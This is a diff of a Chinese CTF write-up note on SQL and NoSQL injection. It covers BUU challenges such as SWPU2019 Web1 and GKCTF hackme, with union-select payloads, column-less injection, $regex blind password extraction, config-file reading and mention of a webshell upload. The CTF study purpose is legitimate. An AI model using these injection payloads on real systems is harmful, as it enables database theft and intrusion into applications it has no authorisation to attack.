@@ -1,6 +1,3 @@
-# SQL注入
-
-# SQL注入
 
 ## 二次注入
 
@@ -10,55 +7,55 @@
 
 原理将不知道名字的列取别名
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled.png)
 
-### ****[SWPU2019]Web1****
+### [SWPU2019]Web1
 
 打开是个登录界面，注册一个账号来看看功能，发现可以发布广告，广告发布后可以查看详情
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%201.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%201.png)
 
 url中有个id的参数感觉是sql注入，然而id并不是注入点，返回了400
 
 在申请的那里order by 的时候发现有过滤，感觉应该在这里注入
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%202.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%202.png)
 
 点开访问的时候发现
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%203.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%203.png)
 
 应该是二次注入
 
 - 查库 'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%204.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%204.png)
 
 - 查表 'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%205.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%205.png)
 
 - 查列名 'union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/FLAG_TABLE),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%206.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%206.png)
 
 - 无列名注入 'union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%207.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%207.png)
 
-### nosql
+## nosql
 
-### ?****[GKCTF 2021]hackme****
+### [GKCTF 2021]hackme
 
 nosql注入，对$eq和$ne应该有检测
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%208.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%208.png)
 
 Unicode编码绕过
 
 显示登录失败，用户名就是admin可以盲注密码
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%209.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%209.png)
 
 用$regex来匹配
 
@@ -85,29 +82,29 @@ for i in range(50):
             break
 ```
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2010.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2010.png)
 
 登录后有一个文件读取
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2011.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2011.png)
 
 根据题目提示去查看了配置文件/usr/local/nginx/conf/nginx.conf发现了有weblogic
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2012.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2012.png)
 
 nginx服务器版本小于1.17.7
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2013.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2013.png)
 
 可以使用请求走私漏洞，burp发包并不理想
 
-### 双写绕过
+## 双写绕过
 
-### ****[HBCTF2017]大美西安****
+### [HBCTF2017]大美西安
 
 F12是web手的基本素质，注册被藏起来了
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2014.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2014.png)
 
 三个功能点，在download这里的查看存在参数为感觉有sql
 
@@ -115,7 +112,7 @@ F12是web手的基本素质，注册被藏起来了
 
 毫无影响，可能是有过滤
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2015.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2015.png)
 
 -1 union select 这显示无这个picture
 
@@ -432,11 +429,11 @@ while True:'''
 
 一句话木马打包执行效果不理想，我选择了将命令上传慢慢执行
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2016.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2016.png)
 
 最后拿下，值得注意的是由于sql语句的比较方法需要传入包的随机名称小于之前上传的包才能在脚本中爆破出文件名
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2017.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2017.png)
 
 ### kzone
 
@@ -444,7 +441,7 @@ www.zip拿源码
 
 注入点再cooike里的admin_user
 
-![Untitled](SQL%E6%B3%A8%E5%85%A5%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2018.png)
+![Untitled](../../CTF赛题/BUU月赛/attachment/SQL注入%207c83b7a8861f4e89aff2bded5a55302b/Untitled%2018.png)
 
 exp.py
 
